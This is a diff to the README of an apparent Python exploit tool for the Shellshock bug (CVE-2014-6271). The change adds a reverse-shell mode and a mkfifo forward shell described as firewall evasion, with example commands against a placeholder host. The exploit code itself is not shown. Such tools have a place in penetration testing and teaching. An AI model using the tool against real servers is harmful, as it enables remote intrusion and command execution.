@@ -4,7 +4,8 @@ CVE-2014-6271 Shellshock
 
 ## Description
 
-A python3 script for the CVE-2014-6271 Shellshock exploit that creates a pseudo interactive shell using mkfifo
+A python3 script for the CVE-2014-6271 Shellshock exploit that creates a reverse shell <br> 
+or a pseudo interactive shell using mkfifo for firewall evasion
 
 ## Getting Started
 
@@ -12,7 +13,12 @@ A python3 script for the CVE-2014-6271 Shellshock exploit that creates a pseudo 
 
 * With python3
 ```
-python3 shellshock.py -t http://exploitshellshock.blah
+python3 shellshock.py -t http://exploitshellshock.blah -lhost 127.0.0.1 -lport 9001
+```
+<br>
+* For forward shell firewall evasion
+```
+python3 shellshock.py -t http://exploitshellshock.blah -fs
 ```
 
 ## Help
